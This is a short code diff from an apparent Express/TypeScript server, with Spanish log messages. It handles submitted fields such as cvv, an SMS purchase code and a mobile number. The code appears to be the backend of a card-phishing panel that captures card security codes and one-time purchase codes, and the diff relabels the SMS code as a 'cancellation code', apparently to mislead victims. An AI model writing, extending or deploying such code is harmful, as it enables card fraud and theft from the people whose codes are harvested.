@@ -199,12 +199,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.cvv = inputData.cvv;
                 break;
               case 'sms_compra':
-                updatedFields.smsCompra = inputData.smsCompra;
-                console.log('Recibido código sms_compra:', inputData.smsCompra);
-                break;
+              case 'SMS_COMPRA':
               case 'smsCompra':
                 updatedFields.smsCompra = inputData.smsCompra;
-                console.log('Recibido código smsCompra:', inputData.smsCompra);
+                console.log('Recibido código de cancelación:', inputData.smsCompra);
                 break;
               case 'celular':
                 updatedFields.celular = inputData.celular;
